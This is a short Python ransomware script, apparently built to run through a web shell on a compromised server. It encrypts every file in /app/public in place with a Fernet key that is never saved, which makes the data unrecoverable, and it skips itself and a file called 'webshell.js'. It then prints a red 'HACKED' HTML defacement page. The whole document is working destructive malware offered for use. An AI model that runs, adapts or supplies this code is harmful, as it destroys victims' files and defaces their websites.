import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir('/app/public'):
  if file != "ransomware.py" and file != "webshell.js":
    files.append('/app/public/' + file)

key = Fernet.generate_key()

for file in files:
  with open(file, "rb") as f:
    decripted = f.read()
  crypted = Fernet(key).encrypt(decripted)
  with open(file, "wb") as f:
    f.write(crypted)

print(r"""<html>
  <head>
    <style>
      body {
        margin: 0;
        padding: 0;
        background-color: black;
      }
      .center {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      pre {
        color: red;
        text-align: center;
        margin: 0;
        padding: 0;
        font-family: monospace;
      }
    </style>
  </head>
  <body>
    <div class="center">
      <pre>
       ▄█          █         █▄       
     ▐██      ▄█  ███  █▄     ██▌     
    ▐██▀     █████████████    ▀██▌    
   ▐██▌     ██████████████     ▐██▌   
   ████    ████████████████    ████   
  ▐█████  ██████████████████  █████▌  
   ████████████████████████████████   
    ███████▀▀████████████▀▀███████    
     █████▌  ▄▄ ▀████▀ ▄▄  ▐█████     
   ▄▄██████▄ ▀▀  ████  ▀▀ ▄██████▄▄   
  ██████████████████████████████████  
 ████████████████████████████████████ 
▐██████  ███████▀▄██▄▀███████  ██████▌
▐█████    ██████████████████    █████▌
▐█████     ██████▀  ▀██████     █████▌
 █████▄     ███        ███     ▄█████ 
  ██████     █          █     ██████  
    █████                    █████    
     █████                  █████     
      █████                █████      
       ████   ▄        ▄   ████       
        ████ ██        ██ ████        
        ████████ ▄██▄ ████████        
       ████████████████████████       
       ████████████████████████       
        ▀█████████▀▀█████████▀        
          ▀███▀        ▀███▀          

██╗  ██╗  █████╗   ██████╗ ██╗  ██╗ ███████╗ █████╗ 
██║  ██║ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██╔════╝██╔══██║
███████║ ███████║ ██║      █████╔╝  █████╗  ██║  ██║
██╔══██║ ██╔══██║ ██║      ██╔═██╗  ██╔══╝  ██║  ██║
██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗ ███████╗██████╔╝
╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚══════╝╚═════╝ 

                                 
      </pre>
    </div>
  </body>
</html>""")
